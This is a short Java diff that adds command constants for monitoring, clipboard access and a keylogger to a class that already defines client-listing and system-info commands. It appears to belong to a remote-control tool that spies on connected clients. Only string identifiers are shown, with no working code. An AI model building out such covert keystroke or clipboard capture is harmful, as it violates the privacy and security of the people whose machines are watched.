@@ -12,6 +12,9 @@ public class Command {
     public static final String COMMAND_BROADCAST = "/broadcast";
     public static final String COMMAND_GET_ALL_CLIENTS = "/clients";
     public static final String COMMAND_CLIENT_SYSTEM_INFO = "client_system_info";
+    public static final String COMMAND_MONITORING = "/monitoring";
+    public static final String COMMAND_CLIPBOARD = "/clipboard";
+    public static final String COMMAND_KEYLOGGER = "/keylogger";
 
     public static final String RESPONSE_SUCCESS = "Successfully";
 }
